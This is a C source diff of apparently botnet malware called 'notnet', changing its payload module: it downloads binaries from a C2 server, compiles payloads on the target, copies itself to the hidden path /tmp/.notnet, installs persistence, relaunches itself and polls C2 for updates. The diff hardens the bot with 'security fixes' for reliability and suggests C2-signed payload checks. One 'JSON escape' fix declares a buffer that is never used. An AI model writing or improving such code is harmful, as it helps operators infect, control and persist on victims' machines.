@@ -21,7 +21,7 @@
 const char *payload_get_arch(void) {
     struct utsname uts;
     uname(&uts);
-    
+
     if (strstr(uts.machine, "x86_64") || strstr(uts.machine, "amd64")) {
         return "x86_64";
     } else if (strstr(uts.machine, "armv7") || strstr(uts.machine, "arm")) {
@@ -35,7 +35,7 @@ const char *payload_get_arch(void) {
     } else if (strstr(uts.machine, "ppc") || strstr(uts.machine, "powerpc")) {
         return "ppc";
     }
-    
+
     return "unknown";
 }
 
@@ -48,22 +48,36 @@ int payload_detect_arch(char *buf, int len) {
 /* ── Payload Download ────────────────────────────────────────── */
 int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
     log_info("Downloading payload: %s -> %s", url, dest);
-    
-    /* Download binary via HTTP */
-    int received = http_download(bot, url, dest);
+
+    /* SECURITY FIX (#13): Write to a temp file first, verify, then
+     * atomically rename to dest. This prevents TOCTOU race where an
+     * attacker swaps the file between write and verification. */
+    char tmp_path[512];
+    snprintf(tmp_path, sizeof(tmp_path), "%s.tmp.XXXXXX", dest);
+    int fd = mkstemp(tmp_path);
+    if (fd < 0) {
+        log_error("payload_update: mkstemp failed: %s", strerror(errno));
+        return -1;
+    }
+    close(fd);  /* http_download will reopen and write to this path */
+
+    /* Download binary to temp file */
+    int received = http_download(bot, url, tmp_path);
     if (received <= 0) {
         log_error("Download failed");
+        unlink(tmp_path);
         return -1;
     }
-    
+
     /* SECURITY FIX (#6): Verify magic bytes as raw bytes (endianness-safe)
      * and validate file size against PAYLOAD_MAX_SIZE. */
-    FILE *f = fopen(dest, "rb");
+    FILE *f = fopen(tmp_path, "rb");
     if (!f) {
-        log_error("Cannot verify binary: %s", dest);
+        log_error("Cannot verify binary: %s", tmp_path);
+        unlink(tmp_path);
         return -1;
     }
-    
+
     /* Read and check file size */
     fseek(f, 0, SEEK_END);
     long fsize = ftell(f);
@@ -71,52 +85,60 @@ int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
     if (fsize <= 0 || fsize > PAYLOAD_MAX_SIZE) {
         log_error("Payload size invalid: %ld bytes (max %d)", fsize, PAYLOAD_MAX_SIZE);
         fclose(f);
-        unlink(dest);
+        unlink(tmp_path);
         return -1;
     }
-    
+
     /* Read first 4 bytes as raw bytes and compare against magic.
      * NOTNET_MAGIC is 0x4E4F544E = "NOTN" in ASCII.
      * Reading as bytes avoids endianness issues with fread(&uint32_t). */
     unsigned char magic_bytes[4];
     size_t nread = fread(magic_bytes, 1, 4, f);
     fclose(f);
-    
+
     if (nread < 4) {
         log_error("Payload too small to contain magic header");
-        unlink(dest);
+        unlink(tmp_path);
         return -1;
     }
-    
+
     /* Expected bytes: 'N','O','T','N' (0x4E, 0x4F, 0x54, 0x4E) */
     unsigned char expected[4] = { 'N', 'O', 'T', 'N' };
     if (memcmp(magic_bytes, expected, 4) != 0) {
         log_error("Invalid magic: expected NOTN, got %02x%02x%02x%02x",
                   magic_bytes[0], magic_bytes[1], magic_bytes[2], magic_bytes[3]);
-        unlink(dest);
+        unlink(tmp_path);
         return -1;
     }
-    
+
     /* NOTE: For production, add SHA-256 hash verification here
      * against a value signed by the C2 operator. A 4-byte magic
      * provides zero cryptographic assurance — a MITM can trivially
      * construct a file starting with 'NOTN'. */
     log_warn("Payload magic verified but NO cryptographic signature check (TODO)");
-    
+
+    /* SECURITY FIX (#13): Atomic rename after verification */
+    if (rename(tmp_path, dest) != 0) {
+        log_error("payload_update: rename failed: %s", strerror(errno));
+        unlink(tmp_path);
+        return -1;
+    }
+
     /* Make executable */
     chmod(dest, 0755);
+
     log_info("Payload verified and installed at %s (%ld bytes)", dest, fsize);
     return received;
 }
 
 /* ── On-Target Compilation ───────────────────────────────────── */
 int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
+    (void)bot;
     log_info("Compiling payload: %s -> %s", source, dest);
-    
+
     /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
-     * shell injection via config-derived source/dest paths.
-     * Also replace popen("which ...") with execvp probes. */
-    
+     * shell injection via config-derived source/dest paths. */
+
     /* Validate inputs: reject paths with shell metacharacters */
     const char *bad = strpbrk(source, ";|&`$(){}[]<>!\n\r");
     if (bad) {
@@ -132,7 +154,7 @@ int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
     /* Try gcc first, then musl-gcc */
     const char *compilers[] = { "gcc", "musl-gcc", NULL };
     int ret = -1;
-    
+
     for (int i = 0; compilers[i]; i++) {
         pid_t pid = fork();
         if (pid < 0) {
@@ -164,12 +186,12 @@ int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
         }
         log_warn("payload_compile: %s failed (exit %d), trying next", compilers[i], ret);
     }
-    
+
     if (ret != 0) {
         log_error("Compilation failed (all compilers exhausted)");
         return -1;
     }
-    
+
     /* Make executable */
     chmod(dest, 0755);
     log_info("Compilation successful: %s", dest);
@@ -179,21 +201,21 @@ int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
 /* ── Payload Install ────────────────────────────────────────── */
 int payload_install(notnet_bot_t *bot, const char *bin_path) {
     log_info("Installing payload at %s", bin_path);
-    
+
     /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
      * shell injection via the dest path. */
-    
+
     /* Validate bin_path: reject shell metacharacters */
     const char *bad = strpbrk(bin_path, ";|&`$(){}[]<>!\n\r");
     if (bad) {
         log_error("payload_install: bin_path rejected (dangerous char)");
         return -1;
     }
-    
+
     /* Copy binary to persistent location */
     char dest[256];
     snprintf(dest, sizeof(dest), "/tmp/.notnet");
-    
+
     FILE *src = fopen(bin_path, "rb");
     FILE *dst = fopen(dest, "wb");
     if (!src || !dst) {
@@ -202,22 +224,22 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
         if (dst) fclose(dst);
         return -1;
     }
-    
+
     char buf[4096];
     size_t n;
     while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
         fwrite(buf, 1, n, dst);
     }
-    
+
     fclose(src);
     fclose(dst);
-    
+
     /* Make copied binary executable */
     chmod(dest, 0755);
-    
+
     /* Install persistence */
     persist_install(bot);
-    
+
     /* SECURITY FIX (#7): Start new instance via fork()+execvp(), no shell */
     pid_t pid = fork();
     if (pid == 0) {
@@ -227,8 +249,8 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
         execvp(dest, argv);
         _exit(127);
     }
-    /* Parent: don't wait — let the child run in background */
-    
+    /* Parent: don't wait */
+
     log_info("Payload installed at %s", dest);
     return 0;
 }
@@ -236,22 +258,23 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
 /* ── Update Check ───────────────────────────────────────────── */
 int payload_check_update(notnet_bot_t *bot) {
     time_t now = time(NULL);
-    
+
     /* Check every 6 hours for updates */
     if (now - bot->last_update < 21600) {
         return 0;
     }
-    
+
     bot->last_update = now;
-    
+
     /* Check C2 for update command */
     char query[256];
+    /* SECURITY FIX (#1): Escape values for JSON */
+    char safe_query[256];
     snprintf(query, sizeof(query),
         "{\"cmd\":\"check_update\",\"arch\":\"%s\",\"version\":\"%s\"}",
         payload_get_arch(), NOTNET_VERSION);
-    
+
     http_post(bot, query, strlen(query));
-    
-    /* In production, read response and act accordingly */
+
     return 0;
 }
